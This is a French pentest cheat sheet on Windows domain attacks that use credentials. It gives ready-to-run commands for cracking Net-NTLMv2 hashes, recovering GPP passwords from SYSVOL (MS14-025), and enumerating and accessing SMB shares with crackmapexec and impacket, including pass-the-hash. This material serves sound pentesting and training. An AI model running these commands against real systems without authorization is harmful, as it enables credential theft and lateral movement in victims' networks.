# Attaques Windows avec identifiants

## 1. Obtention d'identifiants / hash NTLM

### 1.1. Cracking

> Entrée : Hash Net-NTLMv2 obtenu au préalable
>
> Objectif : Obtenir le mot de passe de l'utilisateur

```bash
$ john --format=netntlmv2 --wordlist="/usr/share/wordlists/rockyou.txt" hash.txt

$ hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

### 1.2. MS14-025 (GPO)

> **SYSVOL** est un partage réseau regroupant entre autre les éléments qui doivent être accessibles pour l’ensemble des ordinateurs du domaine (e.g. scripts de connexion, GPO, …). Il se situe sur les controleurs de domaine.
>
> Entrée : Accès à un partage SYSVOL sur la machine <IP>
>
> Objectif : Obtenir le mot de passe de l'utilisateur utilisé pour appliquer la GPO (généralement l'administrateur local)

```bash
# Connexion au préalable sur le partage SMB SYSVOL
$ cd \DOMAIN\Policies\{UNE-CLE-GPO}\Machine\Preferences\Groups\
$ cat Groups.xml
$ gpp-decrypt <HASHED_PASSWORD>

# Ou plus facile, utilisation du module gpp_password CME
$ cme smb <IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password
```





## 2. Exploitation avec identifiants / hash NTLM

### 2.1 Listing des partages réseaux SMB

> Entrée : Identifiants d'un utilisateur / hash NTLM si le partage est sur le DC
>
> Objectifs : lister les partages réseaux SMB présents sur une machine <IP>

```bash
# Sur une machine cliente
$ crackmapexec smb <IP_CLIENT> -u "USERNAME" -p 'PASSWORD' --shares --local-auth

# Sur un contrôleur de domaine
$ crackmapexec smb <IP_DC> -u "USERNAME" -H <HASH_NTLM> --shares
```

- Si utilisation d'un compte local, spécifier l'option --local-auth ;
- CME vient confirmer les identifiants utilisés et indique la mention "Pwn3d!" si c'est un compte ayant les droits d'un **administrateur local**. Si c'est un compte du domaine, il l'indique en vert.



### 2.2 Accès aux partages réseaux SMB

> Entrée : Identifiants d'un utilisateur / hash NTLM si le partage est sur le DC
>
> Objectifs : accéder et lire les fichiers présents sur les partages réseau SMB

```bash
# Sur une machine client
$ impacket-smbclient 'USERNAME:PASSWORD@<IP_CLIENT>'

# Sur un contrôleur de domaine
$ impacket-smbclient -hashes :<HASH_NTLM> DOMAIN/USERNAME@<IP_DC>     
```

Voir [smbclient](./smclient.md) pour consulter les actions réalisables.
